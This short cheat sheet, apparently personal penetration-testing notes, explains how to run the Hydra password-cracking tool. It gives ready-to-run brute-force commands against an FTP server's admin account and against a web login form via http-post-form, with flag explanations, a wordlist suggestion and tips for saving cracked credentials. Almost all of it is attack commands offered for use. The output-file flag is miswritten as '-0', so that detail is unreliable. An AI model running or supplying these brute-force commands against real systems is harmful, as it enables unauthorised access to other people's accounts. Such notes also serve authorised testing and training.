#hydra does not have a native default wordlist, using the Rockyou list is suggested

#example brute force crack on ftp server
hydra -t 1 -l admin -P [path to password.lst] -vV [IPaddress] ftp
--> -t # = preform # tasks
--> -l NAME = try to log in with NAME
--> -P [filepath] = Try password
--> -vV = verbose mode, showing the login+pass for each attempt

#check for joe accounts by adding modifier -e s

#to write found login+pass combinations to fiel, add modifier -0 [fileanme]

# example brute force on a login page
hydra -l admin -P [path to password.lst] [IPaddress] http-post-form "/login.php:user=kate&pwd=^PASS^:F=Password" -t 10
--> http-post-form = the type of attack, when the page has SSL put in https-post-form
--> user=kate&pwd=^PASS^ = POST parameters, you can intercept the POST with Burp to check
--> ^PASS^ = This will tell Hydra where to fill the entry of the wordlist
--> -t = # of threads
